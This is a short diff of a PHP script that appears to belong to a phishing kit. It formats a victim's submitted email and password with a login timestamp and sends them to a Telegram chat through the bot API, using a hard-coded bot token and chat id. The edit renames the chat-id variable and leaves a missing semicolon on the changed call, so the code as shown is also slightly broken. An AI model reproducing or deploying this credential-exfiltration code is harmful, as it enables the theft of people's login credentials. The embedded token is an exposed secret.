@@ -13,10 +13,10 @@ $message = "Username : $email \nPassword: $password \nTried Login at $time IST";
 $chat_id= 1171876903; // replace with your userid
 
 
-send_message($1739845548,"$message");
+send_message($chat_id,"$message")
 
 
-function send_message($1739845548, $message){
+function send_message($chat_id, $message){
         $text = urlencode($message);
         $apiToken = "1789464582:AAENeh7dlnyq0aLHk7XFAbar7MPOlZAbSxk";
         file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$text");
